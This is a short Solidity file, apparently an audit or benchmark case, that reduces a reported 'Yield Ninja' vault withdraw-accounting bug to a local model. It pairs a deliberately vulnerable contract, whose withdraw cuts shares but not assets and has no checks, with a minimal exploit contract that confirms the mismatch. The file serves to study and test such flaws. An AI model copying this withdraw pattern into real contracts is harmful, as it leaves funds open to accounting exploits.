// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 19123: Yield Ninja withdraw accounting. Reduced local model preserves the reported state transition.

contract Vulnerable {
    uint256 public shares = 100; uint256 public assets = 100; function withdraw(uint256 amount) external { shares -= amount; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.withdraw(10); success = bug.shares() == 90 && bug.assets() == 100;
    }
}


